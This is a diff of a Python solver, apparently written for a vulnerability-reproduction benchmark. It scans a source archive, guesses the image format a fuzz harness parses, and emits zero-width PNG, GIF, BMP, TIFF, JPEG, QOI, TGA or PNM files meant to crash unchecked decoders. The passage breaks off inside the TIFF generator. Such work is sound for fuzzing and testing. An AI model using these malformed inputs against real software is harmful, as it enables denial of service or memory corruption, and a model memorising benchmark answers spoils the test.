@@ -1,336 +1,599 @@
 import os
 import re
 import tarfile
+import zipfile
+import tempfile
 import struct
-import binascii
 import zlib
-from typing import Dict, Iterable, Tuple, Optional
-
-
-def _is_probably_text_filename(name: str) -> bool:
-    n = name.lower()
-    if n.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh', '.inc', '.inl', '.m', '.mm',
-                   '.py', '.go', '.rs', '.java', '.kt', '.cs', '.js', '.ts', '.tsx',
-                   '.cmake', 'cmakelists.txt', '.gn', '.gni', '.ninja', '.mk', 'makefile',
-                   '.yaml', '.yml', '.json', '.toml', '.ini', '.cfg', '.txt', '.md',
-                   '.sh', '.bash', '.zsh', '.bat', '.ps1')):
-        return True
-    if any(x in n for x in ('fuzz', 'fuzzer', 'oss-fuzz', 'sanitizer')):
-        if n.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh', '.py', '.txt', '.md', '.sh', '.cmake', '.mk')):
-            return True
-    return False
-
-
-def _iter_source_text_blobs(src_path: str, max_files: int = 2500, max_bytes_per_file: int = 200_000) -> Iterable[Tuple[str, str]]:
-    if os.path.isdir(src_path):
-        count = 0
-        for root, _, files in os.walk(src_path):
-            for fn in files:
-                if count >= max_files:
-                    return
-                path = os.path.join(root, fn)
-                rel = os.path.relpath(path, src_path)
-                if not _is_probably_text_filename(rel):
-                    continue
-                try:
-                    with open(path, 'rb') as f:
-                        b = f.read(max_bytes_per_file)
-                    s = b.decode('latin1', errors='ignore')
-                except Exception:
-                    continue
-                count += 1
-                yield rel, s
-        return
-
-    try:
-        with tarfile.open(src_path, 'r:*') as tf:
-            count = 0
-            for m in tf.getmembers():
-                if count >= max_files:
-                    return
-                if not m.isfile():
-                    continue
-                name = m.name
-                if not _is_probably_text_filename(name):
-                    continue
-                if m.size <= 0:
-                    continue
-                try:
-                    f = tf.extractfile(m)
-                    if f is None:
-                        continue
-                    b = f.read(max_bytes_per_file)
-                    s = b.decode('latin1', errors='ignore')
-                except Exception:
-                    continue
-                count += 1
-                yield name, s
-    except Exception:
-        return
-
-
-def _basename_tokens(src_path: str) -> str:
-    base = os.path.basename(src_path).lower()
-    for ext in ('.tar.gz', '.tgz', '.tar.xz', '.txz', '.tar.bz2', '.tbz2', '.tar', '.zip', '.gz', '.xz', '.bz2'):
-        if base.endswith(ext):
-            base = base[:-len(ext)]
-            break
-    return base
-
-
-def _score_format(src_path: str) -> Dict[str, int]:
-    scores: Dict[str, int] = {
-        'png': 0,
-        'exr': 0,
-        'gif': 0,
-        'bmp': 0,
-        'tiff': 0,
-        'jpeg': 0,
-        'qoi': 0,
-        'pnm': 0,
-    }
-
-    base = _basename_tokens(src_path)
-    def bump(fmt: str, v: int) -> None:
-        scores[fmt] = scores.get(fmt, 0) + v
-
-    if 'exr' in base or 'openexr' in base or 'tinyexr' in base:
-        bump('exr', 40)
-    if 'png' in base or 'spng' in base or 'lodepng' in base:
-        bump('png', 30)
-    if 'gif' in base:
-        bump('gif', 20)
-    if 'bmp' in base:
-        bump('bmp', 20)
-    if 'tiff' in base or 'tif' in base:
-        bump('tiff', 20)
-    if 'jpeg' in base or 'jpg' in base:
-        bump('jpeg', 20)
-    if 'qoi' in base:
-        bump('qoi', 20)
-    if 'pnm' in base or 'ppm' in base or 'pgm' in base or 'pbm' in base or 'netpbm' in base:
-        bump('pnm', 20)
-
-    # Strong indicators inside fuzzers / sources
-    rx = {
-        'exr': [
-            (re.compile(r'\bLoadEXR\b', re.I), 80),
-            (re.compile(r'\bParseEXRHeader\b', re.I), 80),
-            (re.compile(r'\bTinyEXR\b', re.I), 60),
-            (re.compile(r'\bOpenEXR\b', re.I), 60),
-            (re.compile(r'\bImf::', re.I), 60),
-            (re.compile(r'\bImf[A-Za-z0-9_]*\b', re.I), 20),
-            (re.compile(r'\bEXR\b', re.I), 10),
-        ],
-        'png': [
-            (re.compile(r'\bspng_', re.I), 100),
-            (re.compile(r'\blodepng_', re.I), 90),
-            (re.compile(r'\bpng_(create|read|set|get|destroy|sig)\w*', re.I), 60),
-            (re.compile(r'\bIHDR\b', re.I), 20),
-            (re.compile(r'\bIDAT\b', re.I), 20),
-            (re.compile(r'\bPNG\b', re.I), 5),
-        ],
-        'gif': [
-            (re.compile(r'\bDGif(Open|Slurp|Close)\b', re.I), 90),
-            (re.compile(r'\bEGif(Open|Close)\b', re.I), 50),
-            (re.compile(r'\bgiflib\b', re.I), 60),
-            (re.compile(r'\bnsgif\b', re.I), 80),
-            (re.compile(r'\bGIF89a\b', re.I), 10),
-        ],
-        'bmp': [
-            (re.compile(r'\bBITMAP(INFOHEADER|FILEHEADER)\b', re.I), 80),
-            (re.compile(r'\bbiWidth\b', re.I), 30),
-            (re.compile(r'\bbiHeight\b', re.I), 30),
-            (re.compile(r'\bbs?bmp\b', re.I), 40),
-            (re.compile(r'\bbmp\b', re.I), 5),
-        ],
-        'tiff': [
-            (re.compile(r'\bTIFF(Open|ClientOpen|ReadRGBAImage|ReadScanline|ReadEncodedStrip)\b', re.I), 90),
-            (re.compile(r'\blibtiff\b', re.I), 60),
-            (re.compile(r'\bTIFF\b', re.I), 10),
-        ],
-        'jpeg': [
-            (re.compile(r'\bjpeg_(read|create|destroy|start|finish)\w*', re.I), 70),
-            (re.compile(r'\bturbojpeg\b', re.I), 70),
-            (re.compile(r'\bJFIF\b', re.I), 20),
-            (re.compile(r'\bJPEG\b', re.I), 10),
-        ],
-        'qoi': [
-            (re.compile(r'\bqoi_decode\b', re.I), 120),
-            (re.compile(r'\bQOI\b', re.I), 20),
-        ],
-        'pnm': [
-            (re.compile(r'\bnetpbm\b', re.I), 70),
-            (re.compile(r'\b(ppm|pgm|pbm)\b', re.I), 20),
-            (re.compile(r'\bP[1-6]\b', re.I), 5),
-        ],
-    }
-
-    for name, text in _iter_source_text_blobs(src_path):
-        n = name.lower()
-        if 'fuzz' in n or 'fuzzer' in n:
-            bump_val = 15
-            for fmt in scores:
-                if fmt in n:
-                    bump(fmt, bump_val)
-
-        for fmt, rules in rx.items():
-            for r, w in rules:
-                if r.search(text):
-                    bump(fmt, w)
-
-        # If we found a fuzzer entrypoint, add weight to the formats indicated in that file
-        if 'llvmfuzzertestoneinput' in text.lower():
-            for fmt, rules in rx.items():
-                add = 0
-                for r, w in rules:
-                    if r.search(text):
-                        add += w
-                if add:
-                    bump(fmt, 50 + add // 4)
-
-    return scores
-
-
-def _png_chunk(typ4: bytes, data: bytes) -> bytes:
-    return struct.pack(">I", len(data)) + typ4 + data + struct.pack(">I", binascii.crc32(typ4 + data) & 0xffffffff)
-
-
-def _make_png_zero_width(height: int = 256, bit_depth: int = 8, color_type: int = 2, interlace: int = 0) -> bytes:
-    # width == 0 triggers the issue, height > 1 increases chance of ASan reporting even if malloc(0) behaves oddly.
-    width = 0
-    ihdr = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, 0, 0, interlace)
-    # Each scanline is: filter byte + rowbytes. rowbytes is 0 when width=0, so 1 byte per row.
-    raw = b"\x00" * height
-    comp = zlib.compress(raw, 9)
-    out = bytearray()
-    out += b"\x89PNG\r\n\x1a\n"
-    out += _png_chunk(b'IHDR', ihdr)
-    out += _png_chunk(b'IDAT', comp)
-    out += _png_chunk(b'IEND', b'')
-    return bytes(out)
-
-
-def _make_gif_zero_width(height: int = 1) -> bytes:
-    # Minimal GIF with logical screen width=0, height=height.
-    # Uses a tiny 2-color global color table and a minimal image block.
-    header = b"GIF89a"
-    lsd = struct.pack("<HHBBB", 0, height, 0xF0, 0x00, 0x00)  # GCT flag=1, color res=7, size=2
-    gct = b"\x00\x00\x00" + b"\xff\xff\xff"
-    img_desc = b"\x2c" + struct.pack("<HHHHB", 0, 0, 0, height, 0x00)
-    lzw_min = b"\x02"
-    # Minimal image data stream (works for many decoders even if dimensions are invalid)
-    img_data = b"\x02\x4c\x01\x00"
-    trailer = b"\x3b"
-    return header + lsd + gct + img_desc + lzw_min + img_data + trailer
-
-
-def _make_bmp_zero_width(height: int = 1, bpp: int = 24) -> bytes:
-    # BITMAPFILEHEADER (14) + BITMAPINFOHEADER (40) + no pixel data
-    # width==0, height>0
-    width = 0
-    row_size = ((bpp * width + 31) // 32) * 4
-    img_size = row_size * abs(height)
-    off_bits = 14 + 40
-    file_size = off_bits + img_size
-    bf = struct.pack("<2sIHHI", b"BM", file_size, 0, 0, off_bits)
-    bi = struct.pack("<IIIHHIIIIII",
-                     40,
-                     width & 0xffffffff,
-                     height & 0xffffffff,
-                     1,
-                     bpp,
-                     0,
-                     img_size,
-                     2835,
-                     2835,
-                     0,
-                     0)
-    return bf + bi  # no pixel data needed
-
-
-def _make_pnm_zero_width(height: int = 1) -> bytes:
-    # Binary PPM (P6) with width=0
-    # Many decoders treat this as invalid; if not checked it can lead to issues.
-    hdr = f"P6\n0 {height}\n255\n".encode("ascii")
-    # Provide some extra bytes to avoid EOF assumptions
-    return hdr + (b"\x00" * 64)
-
-
-def _exr_attr(name: str, typ: str, value: bytes) -> bytes:
-    nb = name.encode('ascii') + b'\x00'
-    tb = typ.encode('ascii') + b'\x00'
-    return nb + tb + struct.pack("<I", len(value)) + value
-
-
-def _make_exr_zero_width() -> bytes:
-    # Minimal scanline EXR with dataWindow width computed as 0 (max_x = min_x - 1).
-    # Some vulnerable readers fail to validate this and then overflow later.
-    magic = struct.pack("<I", 20000630)  # 0x01312f76
-    version = struct.pack("<I", 2)       # v2, no flags
-    min_x, min_y, max_x, max_y = 0, 0, -1, 0  # width=0, height=1
-
-    # channels: one HALF channel "R"
-    ch = bytearray()
-    ch += b"R\x00"
-    ch += struct.pack("<i", 1)  # HALF
-    ch += b"\x00"               # pLinear
-    ch += b"\x00\x00\x00"       # reserved
-    ch += struct.pack("<i", 1)  # xSampling
-    ch += struct.pack("<i", 1)  # ySampling
-    ch += b"\x00"               # end of channel list
-    channels = bytes(ch)
-
-    compression = b"\x00"  # NO_COMPRESSION
-    line_order = b"\x00"   # increasing y
-    par = struct.pack("<f", 1.0)
-    swc = struct.pack("<ff", 0.0, 0.0)
-    sww = struct.pack("<f", 1.0)
-    box = struct.pack("<iiii", min_x, min_y, max_x, max_y)
-
-    header = bytearray()
-    header += magic + version
-    header += _exr_attr("channels", "chlist", channels)
-    header += _exr_attr("compression", "compression", compression)
-    header += _exr_attr("dataWindow", "box2i", box)
-    header += _exr_attr("displayWindow", "box2i", box)
-    header += _exr_attr("lineOrder", "lineOrder", line_order)
-    header += _exr_attr("pixelAspectRatio", "float", par)
-    header += _exr_attr("screenWindowCenter", "v2f", swc)
-    header += _exr_attr("screenWindowWidth", "float", sww)
-    header += b"\x00"  # end of header
-
-    # Height computed as 1 => offset table with 1 entry.
-    # Put one minimal chunk after the table.
-    offset_table_size = 8
-    chunk_offset = len(header) + offset_table_size
-    offset_table = struct.pack("<Q", chunk_offset)
-
-    # One scanline chunk. Use a small non-zero data_size with some bytes to increase surface area.
-    # Readers should reject due to width==0; fixed versions should stop earlier.
-    y = 0
-    data = b"\x00" * 4096
-    chunk = struct.pack("<iI", y, len(data)) + data
-
-    return bytes(header) + offset_table + chunk
+from collections import Counter
+from typing import Optional, Tuple
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        scores = _score_format(src_path)
+        with tempfile.TemporaryDirectory() as td:
+            base = src_path
+            if os.path.isfile(src_path):
+                base = self._extract_archive(src_path, td)
 
-        # Prefer unambiguous EXR if detected strongly.
-        fmt = max(scores.items(), key=lambda kv: kv[1])[0]
-        if scores.get('exr', 0) >= max(scores.get('png', 0), scores.get('gif', 0), scores.get('bmp', 0)) + 60:
-            fmt = 'exr'
+            fmt = self._infer_format(base)
+            poc = self._poc_from_samples_or_minimal(base, fmt)
+            return poc
 
-        if fmt == 'exr':
-            return _make_exr_zero_width()
-        if fmt == 'gif':
-            return _make_gif_zero_width(height=64)
-        if fmt == 'bmp':
-            return _make_bmp_zero_width(height=64)
-        if fmt == 'pnm':
-            return _make_pnm_zero_width(height=64)
-        # Default to PNG.
-        return _make_png_zero_width(height=512, color_type=2, interlace=0)
+    def _extract_archive(self, src_path: str, td: str) -> str:
+        if tarfile.is_tarfile(src_path):
+            with tarfile.open(src_path, "r:*") as tf:
+                members = tf.getmembers()
+                names = [m.name for m in members if m.name and m.name != "."]
+                self._safe_extract_tar(tf, td, members)
+            return self._choose_root(td, names)
+        if zipfile.is_zipfile(src_path):
+            with zipfile.ZipFile(src_path, "r") as zf:
+                names = [n for n in zf.namelist() if n and n != "."]
+                self._safe_extract_zip(zf, td)
+            return self._choose_root(td, names)
+        return td
+
+    def _safe_extract_tar(self, tf: tarfile.TarFile, dest: str, members) -> None:
+        dest_real = os.path.realpath(dest)
+        for m in members:
+            name = m.name
+            if not name:
+                continue
+            if name.startswith("/") or name.startswith("\\"):
+                continue
+            out_path = os.path.realpath(os.path.join(dest, name))
+            if not out_path.startswith(dest_real + os.sep) and out_path != dest_real:
+                continue
+            try:
+                tf.extract(m, path=dest, set_attrs=False)
+            except Exception:
+                pass
+
+    def _safe_extract_zip(self, zf: zipfile.ZipFile, dest: str) -> None:
+        dest_real = os.path.realpath(dest)
+        for name in zf.namelist():
+            if not name:
+                continue
+            if name.startswith("/") or name.startswith("\\"):
+                continue
+            out_path = os.path.realpath(os.path.join(dest, name))
+            if not out_path.startswith(dest_real + os.sep) and out_path != dest_real:
+                continue
+            try:
+                zf.extract(name, path=dest)
+            except Exception:
+                pass
+
+    def _choose_root(self, td: str, names) -> str:
+        tops = set()
+        for n in names:
+            n = n.lstrip("./")
+            if not n:
+                continue
+            tops.add(n.split("/", 1)[0])
+        if len(tops) == 1:
+            root = os.path.join(td, next(iter(tops)))
+            if os.path.isdir(root):
+                return root
+        return td
+
+    def _iter_files(self, base: str):
+        for root, dirs, files in os.walk(base):
+            dirs[:] = [d for d in dirs if d not in (".git", ".hg", ".svn", "node_modules", "build", "out", "dist")]
+            for fn in files:
+                p = os.path.join(root, fn)
+                yield p
+
+    def _read_text_limited(self, path: str, limit: int = 262144) -> str:
+        try:
+            with open(path, "rb") as f:
+                data = f.read(limit)
+            return data.decode("utf-8", errors="ignore")
+        except Exception:
+            return ""
+
+    def _infer_format(self, base: str) -> str:
+        paths = []
+        harness_texts = []
+        other_texts = []
+
+        text_exts = {
+            ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
+            ".cmake", ".txt", ".md", ".rst", ".yml", ".yaml", ".py",
+            ".mk", ".ac", ".am", ".in", ".gn", ".gni", ".bazel",
+            ".bzl", ".m4", ".meson", ".toml", ".json"
+        }
+
+        harness_paths = []
+        for p in self._iter_files(base):
+            paths.append(p.lower())
+            ext = os.path.splitext(p)[1].lower()
+            if ext in (".c", ".cc", ".cpp", ".cxx"):
+                t = self._read_text_limited(p, 400000)
+                tl = t.lower()
+                if "llvmfuzzertestoneinput" in tl:
+                    harness_paths.append(p)
+                    harness_texts.append(tl)
+
+        if not harness_texts:
+            for p in self._iter_files(base):
+                ext = os.path.splitext(p)[1].lower()
+                if ext in (".c", ".cc", ".cpp", ".cxx"):
+                    t = self._read_text_limited(p, 200000).lower()
+                    if "fuzzertestoneinput" in t or "testoneinput" in t:
+                        harness_paths.append(p)
+                        harness_texts.append(t)
+                        break
+
+        picked_text_sources = set(harness_paths)
+        budget_files = 250
+        for p in self._iter_files(base):
+            if budget_files <= 0:
+                break
+            ext = os.path.splitext(p)[1].lower()
+            if ext not in text_exts:
+                continue
+            if p in picked_text_sources:
+                continue
+            fn = os.path.basename(p).lower()
+            if fn in ("readme", "readme.md", "readme.txt", "cmakelists.txt", "meson.build", "configure.ac", "makefile", "build.gradle"):
+                other_texts.append(self._read_text_limited(p, 200000).lower())
+                budget_files -= 1
+
+        combined = "\n".join(harness_texts + other_texts)
+        combined += "\n" + "\n".join(paths[:2000])
+
+        def has(s: str) -> bool:
+            return s in combined
+
+        if has("gif_lib.h") or has("dgif") or has("egif") or has("giflib"):
+            return "gif"
+
+        if has("spng.h") or has("lodepng") or has("png.h") or has("ihdr") or has("png_read") or has("png_sig_cmp"):
+            return "png"
+
+        if has("tiffio.h") or has("libtiff") or has("tiff"):
+            return "tiff"
+
+        if has("jpeglib.h") or has("jpeg_read_header") or has("jpeg_decompress"):
+            return "jpeg"
+
+        if has("stb_image") or has("stbi_load_from_memory") or has("stbi_load"):
+            return "png"
+
+        if has("bmp") or has("bitmapinfoheader"):
+            return "bmp"
+
+        if has("qoif") or re.search(r"\bqoi\b", combined):
+            return "qoi"
+
+        if has("tga"):
+            return "tga"
+
+        if has("ppm") or has("pgm") or has("pnm"):
+            return "pnm"
+
+        ext_counter = Counter()
+        for p in self._iter_files(base):
+            ext = os.path.splitext(p)[1].lower()
+            if ext in (".png", ".gif", ".tif", ".tiff", ".jpg", ".jpeg", ".bmp", ".qoi", ".tga", ".ppm", ".pgm", ".pnm"):
+                try:
+                    sz = os.path.getsize(p)
+                except Exception:
+                    continue
+                if 8 <= sz <= 2_000_000:
+                    ext_counter[ext] += 1
+        if ext_counter:
+            best = ext_counter.most_common(1)[0][0]
+            return {
+                ".gif": "gif",
+                ".png": "png",
+                ".tif": "tiff",
+                ".tiff": "tiff",
+                ".jpg": "jpeg",
+                ".jpeg": "jpeg",
+                ".bmp": "bmp",
+                ".qoi": "qoi",
+                ".tga": "tga",
+                ".ppm": "pnm",
+                ".pgm": "pnm",
+                ".pnm": "pnm",
+            }.get(best, "png")
+
+        return "png"
+
+    def _poc_from_samples_or_minimal(self, base: str, fmt: str) -> bytes:
+        sample = self._find_sample_by_magic(base, fmt)
+        if sample is not None:
+            patched = self._patch_dimensions(sample, fmt)
+            if patched is not None:
+                return patched
+
+        if fmt == "gif":
+            return self._gen_min_gif_zero_width()
+        if fmt == "tiff":
+            return self._gen_min_tiff_zero_width()
+        if fmt == "bmp":
+            return self._gen_min_bmp_zero_width()
+        if fmt == "jpeg":
+            s = self._find_sample_by_magic(base, "jpeg")
+            if s is not None:
+                patched = self._patch_dimensions(s, "jpeg")
+                if patched is not None:
+                    return patched
+            return self._gen_min_png_zero_width()
+        if fmt == "qoi":
+            return self._gen_min_qoi_zero_width()
+        if fmt == "tga":
+            return self._gen_min_tga_zero_width()
+        if fmt == "pnm":
+            return self._gen_min_pnm_zero_width()
+        return self._gen_min_png_zero_width()
+
+    def _find_sample_by_magic(self, base: str, fmt: str) -> Optional[bytes]:
+        candidates: list[Tuple[int, str]] = []
+        max_scan = 5000
+        for p in self._iter_files(base):
+            if max_scan <= 0:
+                break
+            max_scan -= 1
+            try:
+                sz = os.path.getsize(p)
+            except Exception:
+                continue
+            if sz < 8 or sz > 2_000_000:
+                continue
+            try:
+                with open(p, "rb") as f:
+                    head = f.read(64)
+            except Exception:
+                continue
+
+            ffmt = self._magic_format(head)
+            if ffmt == fmt:
+                candidates.append((sz, p))
+
+        if not candidates:
+            return None
+        candidates.sort(key=lambda x: x[0])
+        for _, p in candidates[:20]:
+            try:
+                with open(p, "rb") as f:
+                    data = f.read()
+                if self._magic_format(data[:64]) == fmt:
+                    return data
+            except Exception:
+                continue
+        return None
+
+    def _magic_format(self, head: bytes) -> str:
+        if head.startswith(b"\x89PNG\r\n\x1a\n"):
+            return "png"
+        if head.startswith(b"GIF87a") or head.startswith(b"GIF89a"):
+            return "gif"
+        if head.startswith(b"BM"):
+            return "bmp"
+        if head.startswith(b"qoif"):
+            return "qoi"
+        if head.startswith(b"II*\x00") or head.startswith(b"MM\x00*"):
+            return "tiff"
+        if len(head) >= 3 and head[0] == 0xFF and head[1] == 0xD8 and head[2] == 0xFF:
+            return "jpeg"
+        if head.startswith(b"P6") or head.startswith(b"P5") or head.startswith(b"P4"):
+            return "pnm"
+        return "unknown"
+
+    def _patch_dimensions(self, data: bytes, fmt: str) -> Optional[bytes]:
+        try:
+            if fmt == "png":
+                return self._patch_png_width_zero(data)
+            if fmt == "gif":
+                return self._patch_gif_image_width_zero(data)
+            if fmt == "bmp":
+                return self._patch_bmp_width_zero(data)
+            if fmt == "tiff":
+                return self._patch_tiff_width_zero(data)
+            if fmt == "jpeg":
+                return self._patch_jpeg_width_zero(data)
+            if fmt == "qoi":
+                return self._patch_qoi_width_zero(data)
+            if fmt == "tga":
+                return self._patch_tga_width_zero(data)
+            if fmt == "pnm":
+                return self._patch_pnm_width_zero(data)
+        except Exception:
+            return None
+        return None
+
+    def _patch_png_width_zero(self, data: bytes) -> Optional[bytes]:
+        if not data.startswith(b"\x89PNG\r\n\x1a\n"):
+            return None
+        b = bytearray(data)
+        off = 8
+        while off + 12 <= len(b):
+            if off + 8 > len(b):
+                break
+            length = struct.unpack(">I", b[off:off + 4])[0]
+            ctype = bytes(b[off + 4:off + 8])
+            cdata_off = off + 8
+            crc_off = cdata_off + length
+            if crc_off + 4 > len(b):
+                break
+            if ctype == b"IHDR" and length == 13 and cdata_off + 13 <= len(b):
+                b[cdata_off:cdata_off + 4] = b"\x00\x00\x00\x00"
+                crc = zlib.crc32(ctype)
+                crc = zlib.crc32(bytes(b[cdata_off:cdata_off + 13]), crc) & 0xFFFFFFFF
+                b[crc_off:crc_off + 4] = struct.pack(">I", crc)
+                return bytes(b)
+            off = crc_off + 4
+        return None
+
+    def _patch_gif_image_width_zero(self, data: bytes) -> Optional[bytes]:
+        if not (data.startswith(b"GIF87a") or data.startswith(b"GIF89a")):
+            return None
+        b = bytearray(data)
+        if len(b) < 13:
+            return None
+        packed = b[10]
+        gct_flag = (packed & 0x80) != 0
+        gct_size = 0
+        if gct_flag:
+            size_code = packed & 0x07
+            gct_size = 3 * (2 ** (size_code + 1))
+        pos = 13 + gct_size
+        if pos > len(b):
+            return None
+
+        while pos < len(b):
+            block_id = b[pos]
+            pos += 1
+            if block_id == 0x2C:
+                if pos + 9 > len(b):
+                    return None
+                width_off = pos + 4
+                height_off = pos + 6
+                b[width_off:width_off + 2] = b"\x00\x00"
+                if b[height_off:height_off + 2] == b"\x00\x00":
+                    b[height_off:height_off + 2] = b"\x01\x00"
+                return bytes(b)
+            elif block_id == 0x21:
+                if pos >= len(b):
+                    return None
+                pos += 1
+                while pos < len(b):
+                    if pos >= len(b):
+                        return None
+                    sz = b[pos]
+                    pos += 1
+                    if sz == 0:
+                        break
+                    pos += sz
+            elif block_id == 0x3B:
+                return None
+            else:
+                return None
+        return None
+
+    def _patch_bmp_width_zero(self, data: bytes) -> Optional[bytes]:
+        if not data.startswith(b"BM"):
+            return None
+        if len(data) < 26:
+            return None
+        b = bytearray(data)
+        dib_size = struct.unpack("<I", b[14:18])[0] if len(b) >= 18 else 0
+        if dib_size < 40 or len(b) < 54:
+            return None
+        b[18:22] = struct.pack("<I", 0)
+        h = struct.unpack("<i", b[22:26])[0]
+        if h == 0:
+            b[22:26] = struct.pack("<i", 1)
+        return bytes(b)
+
+    def _patch_qoi_width_zero(self, data: bytes) -> Optional[bytes]:
+        if not data.startswith(b"qoif"):
+            return None
+        if len(data) < 14:
+            return None
+        b = bytearray(data)
+        b[4:8] = b"\x00\x00\x00\x00"
+        if b[8:12] == b"\x00\x00\x00\x00":
+            b[8:12] = b"\x00\x00\x00\x01"
+        return bytes(b)
+
+    def _patch_tga_width_zero(self, data: bytes) -> Optional[bytes]:
+        if len(data) < 18:
+            return None
+        b = bytearray(data)
+        b[12:14] = b"\x00\x00"
+        if b[14:16] == b"\x00\x00":
+            b[14:16] = b"\x01\x00"
+        return bytes(b)
+
+    def _patch_pnm_width_zero(self, data: bytes) -> Optional[bytes]:
+        try:
+            txt = data.decode("ascii", errors="ignore")
+        except Exception:
+            return None
+        if not (txt.startswith("P6") or txt.startswith("P5") or txt.startswith("P4")):
+            return None
+        lines = txt.splitlines(True)
+        if not lines:
+            return None
+        out = []
+        i = 0
+        out.append(lines[i])
+        i += 1
+        while i < len(lines) and (lines[i].lstrip().startswith("#") or lines[i].strip() == ""):
+            out.append(lines[i])
+            i += 1
+        if i >= len(lines):
+            return None
+        m = re.match(r"\s*(\d+)\s+(\d+)\s*(\r?\n)?", lines[i])
+        if m:
+            height = m.group(2)
+            newline = m.group(3) or "\n"
+            out.append(f"0 {height}{newline}")
+            i += 1
+        else:
+            return None
+        patched = "".join(out) + "".join(lines[i:])
+        return patched.encode("ascii", errors="ignore")
+
+    def _patch_tiff_width_zero(self, data: bytes) -> Optional[bytes]:
+        if len(data) < 8:
+            return None
+        b = bytearray(data)
+        endian = b[:2]
+        if endian == b"II":
+            le = True
+        elif endian == b"MM":
+            le = False
+        else:
+            return None
+        ifd_off = struct.unpack("<I" if le else ">I", b[4:8])[0]
+        if ifd_off < 8 or ifd_off + 2 > len(b):
+            return None
+        num = struct.unpack("<H" if le else ">H", b[ifd_off:ifd_off + 2])[0]
+        ent_off = ifd_off + 2
+        for _ in range(num):
+            if ent_off + 12 > len(b):
+                return None
+            tag, typ, cnt = struct.unpack("<HHI" if le else ">HHI", b[ent_off:ent_off + 8])
+            val_off = ent_off + 8
+            if tag == 256 and cnt == 1:
+                if typ == 3:
+                    b[val_off:val_off + 2] = b"\x00\x00"
+                    return bytes(b)
+                if typ == 4:
+                    b[val_off:val_off + 4] = b"\x00\x00\x00\x00"
+                    return bytes(b)
+            ent_off += 12
+        return None
+
+    def _patch_jpeg_width_zero(self, data: bytes) -> Optional[bytes]:
+        if len(data) < 4 or not (data[0] == 0xFF and data[1] == 0xD8):
+            return None
+        b = bytearray(data)
+        i = 2
+        while i + 4 <= len(b):
+            if b[i] != 0xFF:
+                i += 1
+                continue
+            while i < len(b) and b[i] == 0xFF:
+                i += 1
+            if i >= len(b):
+                break
+            marker = b[i]
+            i += 1
+            if marker in (0xD9, 0xDA):
+                break
+            if i + 2 > len(b):
+                break
+            seglen = struct.unpack(">H", b[i:i + 2])[0]
+            if seglen < 2 or i + seglen > len(b):
+                break
+            payload = i + 2
+            sof_markers = set([0xC0, 0xC1, 0xC2, 0xC3, 0xC5, 0xC6, 0xC7, 0xC9, 0xCA, 0xCB, 0xCD, 0xCE, 0xCF])
+            if marker in sof_markers and payload + 5 < len(b):
+                b[payload + 3:payload + 5] = b"\x00\x00"
+                if b[payload + 1:payload + 3] == b"\x00\x00":
+                    b[payload + 1:payload + 3] = b"\x00\x01"
+                return bytes(b)
+            i += seglen
+        return None
+
+    def _gen_min_png_zero_width(self) -> bytes:
+        sig = b"\x89PNG\r\n\x1a\n"
+        ihdr_data = struct.pack(">I", 0) + struct.pack(">I", 1) + bytes([8, 2, 0, 0, 0])
+        ihdr = self._png_chunk(b"IHDR", ihdr_data)
+        idat_payload = zlib.compress(b"\x00")
+        idat = self._png_chunk(b"IDAT", idat_payload)
+        iend = self._png_chunk(b"IEND", b"")
+        return sig + ihdr + idat + iend
+
+    def _png_chunk(self, ctype: bytes, data: bytes) -> bytes:
+        crc = zlib.crc32(ctype)
+        crc = zlib.crc32(data, crc) & 0xFFFFFFFF
+        return struct.pack(">I", len(data)) + ctype + data + struct.pack(">I", crc)
+
+    def _gen_min_gif_zero_width(self) -> bytes:
+        header = b"GIF89a"
+        lsd = struct.pack("<HHBBB", 1, 1, 0x80, 0x00, 0x00)
+        gct = b"\x00\x00\x00\xff\xff\xff"
+        img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, 0, 1, 0)
+        lzw_min = b"\x02"
+        img_data = b"\x02\x02\x4C\x01\x00"
+        trailer = b"\x3B"
+        return header + lsd + gct + img_desc + lzw_min + img_data + trailer
+
+    def _gen_min_bmp_zero_width(self) -> bytes:
+        file_header = b"BM" + struct.pack("<IHHI", 54, 0, 0, 54)
+        info_header = struct.pack("<IIIHHIIIIII",
+                                  40, 0, 1, 1, 24, 0, 0, 0, 0, 0, 0)
+        return file_header + info_header
+
+    def _gen_min_tga_zero_width(self) -> bytes:
+        hdr = bytearray(18)
+        hdr[2] = 2
+        hdr[12:14] = b"\x00\x00"
+        hdr[14:16] = b"\x01\x00"
+        hdr[16] = 24
+        return bytes(hdr)
+
+    def _gen_min_qoi_zero_width(self) -> bytes:
+        # Magic + width(0) + height(1) + channels(4) + colorspace(0) + end marker
+        end_marker = b"\x00" * 7 + b"\x01"
+        return b"qoif" + struct.pack(">II", 0, 1) + bytes([4, 0]) + end_marker
+
+    def _gen_min_pnm_zero_width(self) -> bytes:
+        return b"P6\n0 1\n255\n"
+
+    def _gen_min_tiff_zero_width(self) -> bytes:
+        le = True
+        endian = b"II"
+        magic = b"*\x00"
+        ifd_off = 8
+        entries = []
+
+        def ent(tag, typ, cnt, val):
+            if typ == 3 and cnt == 1:
+                v = struct.pack("<H", val) + b"\x00\x00"
+            else:
+                v = struct.pack("<I", val)
+            return struct.pack("<HHI", tag, typ, cnt) + v
+
+        # We'll append BitsPerSample array after IFD, then strip offset after that.
+        # Fill strip offset later.
+        entries.append(ent(256, 4, 1, 0))       # ImageWidth LONG 0
+        entries.append(ent(257, 4, 1, 1))       # ImageLength LONG 1
+        entries.append(ent(258, 3, 3, 0))       # BitsPerSample SHORT[3] -> offset later
+        entries.append(ent(259, 3, 1, 1))       # Compression = 1
+        entries.append(ent(262, 3, 1, 2))       # Photometric = RGB
+        entries.append(ent(273, 4, 1, 0))       # StripOffsets -> later
+        entries.append(ent(277, 3, 1, 3))       # SamplesPerPixel = 3
+        entries.append(ent(278, 4, 1, 1))       # RowsPerStrip = 1
+        entries.append(ent(279, 4, 1, 0))       # StripByteCounts = 0
+        entries.append(ent(284, 3, 1, 1))       # PlanarConfiguration = 1
+
+        num = len(entries)
+        ifd = struct.pack("<H", num) + b"".join(entries) + struct.pack("<I", 0)
+        header = endian + magic + struct.pack("<I", ifd_off)
+
+        bits_off = ifd_off + len(ifd)
+        bits_data = struct.pack("<HHH", 8, 8, 8)
+        strip_off = bits_off + len(bits_data)
+
+        b = bytearray(header + ifd + bits_data)
+
